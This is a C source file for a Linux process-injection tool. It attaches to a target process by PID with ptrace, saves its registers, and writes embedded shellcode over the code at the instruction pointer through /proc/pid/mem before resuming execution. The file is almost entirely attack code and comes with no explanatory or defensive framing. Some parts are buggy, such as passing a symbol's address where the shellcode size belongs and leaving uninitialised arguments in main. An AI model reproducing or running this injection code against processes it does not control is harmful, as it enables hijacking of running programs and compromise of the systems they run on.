#define _GNU_SOURCE
#include <sys/ptrace.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <stdint.h>
#include <sys/uio.h>
#include <linux/ptrace.h>
#include <elf.h>
#include <sys/user.h>
#include <sys/stat.h>
#include <malloc.h>
#include <fcntl.h>


#define FAILED_TO_TRACE() \
    printf("[+] Failed to trace %d\n", pid); \
    exit(1);


extern unsigned char _binary_raw_shellcode_bin_start;
extern unsigned char _binary_raw_shellcode_bin_end;
extern long _binary_raw_shellcode_bin_size;

void* tracee_pc_saved_data;


struct user_regs_struct saved_uregs;
struct user_regs_struct uregs;

void DumpHex(const void* data, size_t size) {
	char ascii[17];
	size_t i, j;
	ascii[16] = '\0';
	for (i = 0; i < size; ++i) {
		printf("%02X ", ((unsigned char*)data)[i]);
		if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
			ascii[i % 16] = ((unsigned char*)data)[i];
		} else {
			ascii[i % 16] = '.';
		}
		if ((i+1) % 8 == 0 || i+1 == size) {
			printf(" ");
			if ((i+1) % 16 == 0) {
				printf("|  %s \n", ascii);
			} else if (i+1 == size) {
				ascii[(i+1) % 16] = '\0';
				if ((i+1) % 16 <= 8) {
					printf(" ");
				}
				for (j = (i+1) % 16; j < 16; ++j) {
					printf("   ");
				}
				printf("|  %s \n", ascii);
			}
		}
	}
}

void print_x86_64_registers(struct user_regs_struct *urs){
    printf("r15: %p\n", urs->r15);
    printf("r14: %p\n", urs->r14);
    printf("r13: %p\n", urs->r13);
    printf("r12: %p\n", urs->r12);
    printf("rbp: %p\n", urs->rbp);
    printf("rbx: %p\n", urs->rbx);
    printf("r11: %p\n", urs->r11);
    printf("r10: %p\n", urs->r10);
    printf("r9: %p\n", urs->r9);
    printf("r8: %p\n", urs->r8);
    printf("rax: %p\n", urs->rax);
    printf("rcx: %p\n", urs->rcx);
    printf("rdx: %p\n", urs->rdx);
    printf("rsi: %p\n", urs->rsi);
    printf("rdi: %p\n", urs->rdi);
    printf("orig_rax: %p\n", urs->orig_rax);
    printf("rip: %p\n", urs->rip);
    printf("cs: %p\n", urs->cs);
    printf("eflags: %p\n", urs->eflags);
    printf("rsp: %p\n", urs->rsp);
    printf("ss: %p\n", urs->ss);
    printf("fs_base: %p\n", urs->fs_base);
    printf("gs_base: %p\n", urs->gs_base);
    printf("ds: %p\n", urs->ds);
    printf("es: %p\n", urs->es);
    printf("fs: %p\n", urs->fs);
    printf("gs: %p\n", urs->gs);
}

enum RegionPermissions{
    NONE = 0,
    READ = 1,
    WRITE = 2,
    EXECUTE = 4,
};

struct ProcMapsEntry {
    void * region_start;
    void * region_end;
    int permissons;
    char ** path;
};

int save_process_state_and_inject_transitional_shellcode(int pid){
    struct iovec iov = {.iov_len = sizeof(saved_uregs),
                        .iov_base = &saved_uregs};
    if (ptrace(PTRACE_GETREGSET, pid, NT_PRSTATUS, &iov) == -1){
        perror("ptrace");
        exit(1);
    }
    printf("[+] Registers saved\n");
    int fd;
    char buf[128];
    sprintf(buf, "/proc/%d/mem", pid);

    if ((fd = open(buf, O_RDWR)) == -1){
        perror("open");
        exit(1);
    }
    tracee_pc_saved_data = malloc(&_binary_raw_shellcode_bin_size);
    lseek(fd, saved_uregs.rip, SEEK_SET);
    read(fd, tracee_pc_saved_data, &_binary_raw_shellcode_bin_size);
    lseek(fd, saved_uregs.rip, SEEK_SET);
    write(fd, &_binary_raw_shellcode_bin_start, &_binary_raw_shellcode_bin_size);
    close(fd);

    //debug print stuff
    DumpHex(tracee_pc_saved_data, &_binary_raw_shellcode_bin_size);
    print_x86_64_registers(&saved_uregs);

    return 0;
}


int attach_and_inject(int pid, void* shellcode, size_t size){

    printf("[+] Attaching to: %d\n", pid);
    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1){
        perror("ptrace");
        FAILED_TO_TRACE();
    }

    int wstatus;
    if (waitpid(pid, &wstatus, WUNTRACED) == -1){
        perror("waitpid");
        FAILED_TO_TRACE();
    }

    if (WIFEXITED(wstatus)){
        printf("process exited\n");
        FAILED_TO_TRACE();
    } else if (WIFSIGNALED(wstatus)) {
        printf("signaled \n");
        FAILED_TO_TRACE();
    }else if (WIFSTOPPED(wstatus)) {
        //stopped correctly
        printf("[+] Stopped target process\n");
        save_process_state_and_inject_transitional_shellcode(pid);
    }


    if (ptrace(PTRACE_CONT, pid, 0, 0) == -1){
        perror("ptrace");
    }

    /*
    puts("waitpid");
    if (waitpid(pid, &wstatus, WUNTRACED) == -1){
        perror("waitpid");
        FAILED_TO_TRACE();
    }

    if (WIFEXITED(wstatus)){
        printf("process exited\n");
        FAILED_TO_TRACE();
    } else if (WIFSIGNALED(wstatus)) {
        printf("signaled \n");
    }else if (WIFSTOPPED(wstatus)) {
        //stopped correctly
        printf("[+] Stopped target process again???\n");
    }
    */


    return 0;
}


int main (int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <pid> <binary>\n", argv[0]);
        exit(0);
    }

    int pid = atoi(argv[1]);
    void* shellcode;
    size_t size;

    attach_and_inject(pid, shellcode, size);

    return 0;
}
